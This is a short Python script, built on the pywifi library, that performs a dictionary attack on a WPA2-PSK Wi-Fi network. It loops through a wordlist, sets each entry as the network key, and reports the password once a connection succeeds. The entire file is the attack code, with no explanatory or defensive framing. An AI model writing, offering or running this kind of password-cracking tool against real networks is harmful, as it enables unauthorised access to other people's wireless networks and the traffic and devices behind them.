import pywifi
from pywifi import const

def dictionary_attack(ssid, dictionary_path):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    with open(dictionary_path, 'r') as file:
        for password in file:
            password = password.strip()
            profile.key = password
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            if iface.status() == const.IFACE_CONNECTED:
                return f"Password found: {password}"
    return "Password not found"
